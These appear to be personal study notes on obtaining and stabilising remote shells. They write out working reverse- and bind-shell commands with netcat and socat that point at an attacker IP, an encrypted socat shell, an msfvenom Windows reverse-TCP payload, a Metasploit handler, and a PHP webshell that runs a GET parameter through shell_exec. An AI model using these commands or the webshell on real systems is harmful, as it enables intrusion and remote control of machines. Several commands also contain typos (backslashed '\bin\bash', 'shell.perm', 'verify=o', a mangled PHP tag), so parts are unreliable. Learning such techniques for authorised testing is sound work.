### What is the shell
- Shells are used when interfacing with a command line environment.
- To force remote systems to execute arbitrary code.e.g webserver, we can do so by obtaining a shell during initial access, that runs on the target.

- **Reverse shell** - The attacker forces the remote server to send command line access him/her
- **Bind shell** - The attacker opens up a port on the server which we can connect to in order to execute further commands.

### Tools
- There are various tools we can use to receive reverse shells and to send bind shells.
1. Netcat
2. Socat
3. Metasploit - multi/handler
4. Msfvenom

### Types of shells
#### 1. Reverse shells
- The target is forced to execute code that connects back to your computer.
- A listener would be used to receive the connection
- Recommended to bypass firewals that prevent one from connecting to arbitrary ports on the target.
> example:
- On attacking machine execute:
```
nc -lvnp 4444
```
- On target execute:
```
nc <Attacker IP> <Port> -e /bin/bash
````
#### 2. Bind shells
- Is when the code executed on target is used to start a listener attached to a shell directly on the target.
- This would then be opened to the internet, meaning you can connect to the port the code has opened and obtain an rce.
> example:
- On target execute:
```
nc -lvnp <port> -e "cmd.exe"
```
- -l - listener
- -v - request verbose ouput
- -n - not resolve hostnames or use dns
- -p - port specification will follow
- On attacking machine execute:
```
nc <target ip> <port>
```

#### Interactivity
1. **Interactive shells** - Allow one to interact with the programs after executing them.e.g. ssh
2. **Non-interactive shells** - One is limited to using programs that do not require user interaction in order to run properly.

### Netcat stabilization
#### Technique one: python
1. Spawn an interactive shell
```
python3 -c 'import pty;pty.spawn("\bin\bash")';
```
2. Step 2
```
export TERM=xterm
```
- This gives us access to term commands such as **clear**
3. Finally back the shell using Ctrl+z.
- Back in our terminal use
```
stty raw -echo; fg
```
- This turns off our own terminal echo(gives us access to tab autocompletes, arrow keys, ctrl+c to kill processes, etc). It then foregrounds the shell, thus completing the process

#### Technique two: rlwrap
- rlwrap gives us acess to history, tab, autocompletion and arrow keys immediately it receives a shell.
- Doesn't come by default, so install it:
```
sudo apt install rlwrap
```
- To use rlrap, we invoke the listerner as:
```
rlwrap nc -lvnp <port>
```
**nb**useful for windows shell which are often difficult to stabilize

#### Technique three: socat
- Use netcatas an intial stepping stone into a more fully featured socat shell.
- Transfer socat requiring no dependancies to target.

### Socat
##### Socat Reverse Shells
- On attacking machine:
```
socat TCP-L:<port> -
```
- On a windows target:
```
socat TCP:<attacker ip>:<port> EXEC:powershell.exe,pipes
```
- **pipes** is used to force powershell to use unix style standard input and output.
- On a linux target:
```
socat TCP:<attacker ip>:<port> EXEC:"bash -li"
```

##### Socat Bind Shells
- On a linux target:
```
socat TCP-L:<port> EXEC:"bash -li"
```
- On a windows target:
```
socat TCP-L:<port> EXEC:powershell.exe,pipes
```
- On attacking machine:
```
socat TCP:<Target-IP>:<port> -
```
- For a stable socat shell(where target is linux), use the listener:
```
socat TCP-L:<port> FILE:`tty`,raw,echo=0
```
- Whereas on the target use:
```
socat TCP:<Attacker-IP>:<port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```

##### Socat Encrypted Shells
- Encypted shells offer protection from being spied on.
- First, generate a certificate to use for encrypted shells.e.g
```
openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
```
- This creates a 2048 bit rsa key with a matching cert file, selfsigned and valid for 362 days.
- Merge the two created files into a single **.pem** file:
```
cat shell.key shell.crt > shell.pem
```
- From here, we can setup the reverse listener using:(setups an openssl listener using our cert, verify=0 tells connection to not validate the certificate)
```
socat OPENSSL-LISTEN:<port>,cert=shell.perm,verify=o -
```

- **nb**: certificate is used on the listener

- To connect to the listener:
```
socat OPENSSL:<listener-ip>:<port>,verify=0 EXEC:/bin/bash
```

### msfvenom
- standard syntax:
```
msfvenom -p <payload> <options>
```
.e.g. for a windows x64 reverse shell in exe format:
```
msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-ip> LPORT=<listen-port>
```
- Payload naming convection:
> <OS>/<archtecture>/<payload>
e.g.
> linux/x86/shell_reverse_tcp

### metasploit multi/handler
- Launch using:
```
msfconsole

use multi/handler
```
- Then set the PAYLOAD, LHOST and LPORT then exploit.


### Webshells
- Is a script runnning on a webserver
e.g.
```
<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</payload>pre>"; ?>
```
- shell_exec executes commands given as system commands.